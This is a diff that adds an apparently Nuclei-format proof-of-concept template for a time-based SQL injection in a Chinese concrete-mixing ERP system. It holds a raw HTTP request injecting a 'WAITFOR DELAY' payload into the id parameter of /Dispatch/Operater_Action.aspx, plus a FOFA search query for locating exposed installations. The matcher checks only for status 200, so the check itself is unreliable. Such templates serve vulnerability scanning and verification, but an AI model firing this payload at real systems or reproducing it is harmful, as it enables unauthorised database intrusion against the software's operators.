@@ -1,0 +1,35 @@
+id: poc-yg17ytimge2p7155
+info:
+  name: 商混ERP系统 operater-action sql注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yg17ytimge2p7155'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yg17ytimge2p7155
+    fofa: title="商混ERP系统" || body="商混ERP系统"
+http:
+- raw:
+  - 'GET /Dispatch/Operater_Action.aspx?action=TaskComplete&id=''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
